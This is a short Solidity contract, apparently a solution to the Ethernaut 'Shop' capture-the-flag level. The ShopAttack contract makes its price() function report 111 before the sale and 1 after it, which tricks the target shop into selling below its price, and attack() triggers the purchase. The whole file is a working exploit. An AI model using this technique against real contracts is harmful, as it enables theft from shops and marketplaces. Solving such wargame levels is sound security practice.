// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

interface IShop {
  function buy() external;
  function isSold() external view returns (bool);
}

contract ShopAttack is Buyer {
    IShop public ethernautInstance;

    constructor (address instanceAddress) {
        ethernautInstance = IShop(instanceAddress);
    }

    function price() external override view returns(uint){
        if (!ethernautInstance.isSold()){
            return 111;
        } else {
            return 1;
        }
    } 

    function attack() public {
        ethernautInstance.buy();
    }
}